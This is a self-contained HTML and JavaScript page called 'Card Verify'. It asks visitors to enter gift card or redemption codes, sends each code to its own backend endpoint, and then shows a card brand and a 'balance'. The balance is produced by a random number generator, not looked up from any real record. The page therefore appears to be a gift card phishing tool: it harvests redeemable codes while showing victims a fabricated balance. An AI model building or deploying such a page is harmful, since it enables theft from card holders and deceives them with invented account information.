<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Card Verify</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
  background: #f1f5f9;
}

.header {
  background: linear-gradient(90deg, #6366f1, #4f46e5);
  padding: 18px;
  color: white;
  font-weight: bold;
}

.container {
  background: white;
  margin: -20px auto 20px;
  padding: 25px;
  border-radius: 15px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
}

.logo {
  text-align: center;
  font-size: 28px;
  margin-bottom: 10px;
}

label {
  display: block;
  margin-top: 15px;
  font-weight: 600;
}

input {
  width: 100%;
  padding: 12px;
  margin-top: 8px;
  border-radius: 8px;
  border: 1px solid #cbd5e1;
}

button {
  margin-top: 20px;
  width: 100%;
  padding: 14px;
  background: #4f46e5;
  color: white;
  border: none;
  border-radius: 10px;
  font-weight: bold;
}

.loader {
  border: 4px solid #e2e8f0;
  border-top: 4px solid #4f46e5;
  border-radius: 50%;
  width: 35px;
  height: 35px;
  margin: 40px auto;
  animation: spin 1s linear infinite;
}

.step { display: none; text-align: center; }
.step.active { display: block; }

.balance {
  font-size: 26px;
  font-weight: bold;
  color: green;
}

.error { color: red; }

@keyframes spin {
  100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="header">✔ Card Verify</div>

<!-- STEP 1 -->
<div class="container step active" id="step1">

  <div id="logo" class="logo">💳</div>

  <label>Redemption Code</label>
  <input id="code"
    placeholder="Enter code"
    oninput="handleInput(this)">

  <button onclick="verify()">Check Status</button>

  <div id="error" class="error"></div>

</div>

<!-- STEP 2 -->
<div class="step" id="step2">
  <h2>Checking...</h2>
  <div class="loader"></div>
</div>

<!-- STEP 3 -->
<div class="container step" id="step3">
  <h2 id="status"></h2>
  <p id="type"></p>
  <p id="balance" class="balance"></p>
  <button onclick="reset()">Try Again</button>
</div>

<script>
// 🔍 Detect card type
function detectCardType(code) {
  if (/^A/i.test(code)) return "apple";
  if (/^4/.test(code)) return "visa";
  if (/^5/.test(code)) return "mastercard";
  if (/^P/i.test(code)) return "premium";
  return "generic";
}

// 🎨 Update UI
function updateUI(type) {
  const logo = document.getElementById("logo");

  if (type === "apple") {
    logo.textContent = "";
  } else if (type === "visa") {
    logo.textContent = "VISA";
  } else if (type === "mastercard") {
    logo.textContent = "MC";
  } else if (type === "premium") {
    logo.textContent = "★";
  } else {
    logo.textContent = "💳";
  }
}

// 🔤 Input handler
function handleInput(input) {
  input.value = input.value.toUpperCase().replace(/[^A-Z0-9]/g,'');

  const type = detectCardType(input.value);
  updateUI(type);
}

// 🔗 Verify with backend
async function verify() {
  const code = document.getElementById("code").value;
  const error = document.getElementById("error");

  if (!/^[A-Z0-9]{4,}$/.test(code)) {
    error.textContent = "Invalid code format";
    return;
  }

  error.textContent = "";
  show("step2");

  try {
    const res = await fetch("/api/verify", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ code })
    });

    const data = await res.json();

    show("step3");

    const type = detectCardType(code);

    if (data.success) {
      document.getElementById("status").textContent = "Valid Code";

      const balance = Math.floor(Math.random() * 200) + 20;

      document.getElementById("balance").textContent = "$" + balance;
      document.getElementById("type").textContent =
        type.charAt(0).toUpperCase() + type.slice(1) + " Card";

    } else {
      document.getElementById("status").textContent = "Invalid Code";
      document.getElementById("balance").textContent = "";
      document.getElementById("type").textContent = "";
    }

  } catch {
    show("step3");
    document.getElementById("status").textContent = "Error";
  }
}

// 🔁 UI helpers
function show(id) {
  document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
  document.getElementById(id).classList.add("active");
}

function reset() {
  document.getElementById("code").value = "";
  document.getElementById("logo").textContent = "💳";
  show("step1");
}
</script>

</body>
</html>
